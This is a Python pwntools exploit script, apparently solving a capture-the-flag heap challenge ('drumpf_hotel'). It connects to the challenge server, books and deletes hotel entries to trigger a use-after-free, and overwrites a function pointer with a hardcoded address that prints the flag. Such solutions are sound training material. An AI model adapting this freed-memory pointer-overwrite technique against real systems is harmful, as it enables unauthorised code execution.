#!/usr/bin/env python

from pwn import *

#p = process('./drumpf_hotel')
p = remote('drumpf.vuln.icec.tf', port=6502)
print(util.proc.pidof(p))
e = raw_input()
print(p.recv())


def book_a_suite(payload, number):
    p.sendline('1')
    print(p.recv())
    p.sendline(payload)
    print(p.recv())
    p.sendline('%s' % number)
    print(p.recv())


def book_a_room(payload, number):
    p.sendline('2')
    print(p.recv())
    p.sendline(payload)
    print(p.recv())
    p.sendline('%s' % number)
    print(p.recv())


def delete_booking():
    p.sendline('3')
    print(p.recv())


def print_booking():
    p.sendline('4')
    print(p.recv())


flag = 0x0804863d

payload = '\x41' * 8
payload_2 = '\x42' * 8
payload_3 = 'Q' * 8
book_a_suite(payload, 1)
book_a_room(payload_2, 2)
delete_booking()
book_a_room(payload, flag)
print_booking()
print_booking()
#print(p.recvall(10))
